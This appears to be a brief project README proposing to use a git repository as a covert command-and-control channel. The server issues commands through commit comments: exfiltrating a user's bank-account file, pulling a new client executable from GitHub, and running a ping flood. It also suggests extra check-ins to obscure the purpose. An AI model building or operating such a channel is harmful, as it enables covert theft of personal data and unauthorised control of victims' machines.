# gitexfil
Exploration into using GIT repository as a means of C&amp;C

Idea here is that client and server utilize GIT as a means of communication and file exfiltration. Example:

Data Exfiltration
Server -> Git Commit #1a2b3c4d5e Comment: download C:\Users\DumbUser\Desktop\Finances\MyBankAccountNumbers.txt
Client <- Git Push file as commit#+filename, so multiple copies of file can be collected w/o clobbering.

Client Update
Server -> Git Commit #dead Comment: update git://github.com/JousterL/gitexfil/newClient.exe
Client <- Git Checkout HEAD -- newClient.exe

Other Actions
Server -> Git Commit #5a4b3c2d1e Comment: ping 172.16.1.1 -t -l 5000
Client <- Git Checkout + Perform Action requested. Perhaps a return push with no file changes and a new comment with status?

Halt Actions
Server -> Git Commit #1111111111 Comment: halt
Client <- Git Checkout + Stop all previous actions

Client would do a Git Checkout each x minutes, server would be on demand (per needs of user, perhaps additional checkins to obfuscate purpose?)
